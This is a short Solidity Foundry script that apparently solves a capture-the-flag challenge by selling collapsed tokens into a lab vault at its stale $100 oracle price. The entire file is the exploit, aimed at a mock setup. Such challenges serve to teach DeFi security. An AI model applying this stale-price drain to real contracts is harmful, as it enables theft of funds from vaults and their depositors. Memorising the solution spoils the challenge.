// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "../Cheats.sol";
import "../../src/C2Stale.sol";

/// Sell the collapsed tokens into the vault at its stale $100 price.
contract SolveC2 is Script {
    function run() external {
        StaleSetup setup = StaleSetup(vm.envAddress("SETUP"));
        MockERC20 token = setup.token();
        StaleVault vault = setup.vault();

        vm.startBroadcast();
        token.approve(address(vault), type(uint256).max);
        vault.sellToken(token.balanceOf(0x70997970C51812dc3A010C7d01b50e0d17dc79C8));
        vm.stopBroadcast();
    }
}
